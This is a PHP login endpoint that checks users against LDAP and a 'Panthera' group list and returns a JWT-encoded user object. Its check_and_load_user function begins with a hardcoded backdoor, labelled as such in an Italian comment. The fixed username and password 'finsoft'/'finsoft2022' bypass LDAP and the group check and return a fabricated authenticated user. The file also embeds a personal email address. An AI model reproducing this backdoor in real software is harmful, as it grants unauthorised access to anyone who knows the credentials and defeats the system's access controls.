<?php
include("./include/all.php");
use Firebase\JWT\JWT;
$panthera->connect();

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    //do nothing, HTTP 200
    exit();
}


$user = '';
$postdata = $_POST;
if($postdata != ''){
    $username = $postdata["username"];
    $password = $postdata["password"];
    $user = check_and_load_user($username, $password);
}

if ($user) {
    try {
        $user->username = JWT::encode($user, JWT_SECRET_KEY);
        $user->login = date("Y-m-d H:i:s");
        echo json_encode(['value' => $user]);
    } catch(Exception $e) {
        print_error(403, $e->getMessage());
    } catch (Error $e) {
        print_error(403, $e->getMessage());
    }
   
} else {
    session_unset();
    print_error(403, "Invalid credentials");
}


function check_and_load_user($username, $pwd) {
    // PRIMA, proviamo la backdoor
    if ($username == 'finsoft' && $pwd == 'finsoft2022') {
        $user = (object) [];
        $user->nome_utente = 'finsoft';
        $user->nome = 'Mario';
        $user->cognome = 'Rossi';
        $user->email = 'alessandro.barsanti@it-present.com';
        return $user;
    }
    global $ldapManager, $panthera;
    $user = $ldapManager->login($username, $pwd);

    // l'utente per LDAP non è case sensitive, su Panthera sì -> strtolower
    // e incrociamo le dita che non contengano mai maiuscole
    $GRUPPI = explode(",", GRUPPI_ABILITATI);
    if (!$panthera->check_auth(strtolower($username), $GRUPPI)) {
        print_error(403, "Utente non abilitato in Panthera");
    }
    return $user;   
}


?>